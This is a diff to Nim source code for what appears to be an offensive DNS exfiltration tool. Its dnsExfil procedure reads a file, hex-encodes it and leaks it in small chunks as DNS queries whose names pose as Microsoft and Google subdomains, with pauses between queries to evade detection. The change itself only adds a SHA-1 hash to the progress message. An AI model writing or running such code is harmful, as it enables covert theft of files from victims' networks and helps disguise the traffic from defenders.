@@ -1,4 +1,4 @@
-import std/[os, strutils, random]
+import std/[os, strutils, random, sha1]
 import pkg/ndns
 randomize()
 
@@ -29,11 +29,12 @@ proc dnsExfil(ns: string, file: string, slp: int): void =
     let
         client = initDnsClient(ns)
         content = readFile(file)
+        hash = secureHash(content)
         hex = content.toHex
         chuckSize = 20 # max 62
         domains = [".client.a.msn.windows.com", ".a.wns.update.windows.com", ".a.wns.o365.microsoft.com", ".msft.a.msn.microsoft.com"]
     
-    echo "[+] Sending ", file, " [lengh: ", content.len, "]"
+    echo "[+] Sending ", file, " [lengh: ", content.len, "][hash: ", hash, "]" 
     
     chuckIndX(client, file.toHex, chuckSize, ".bb.googleusercontent.com", slp)
     chuckIndX(client, hex, chuckSize, sample(domains), slp)
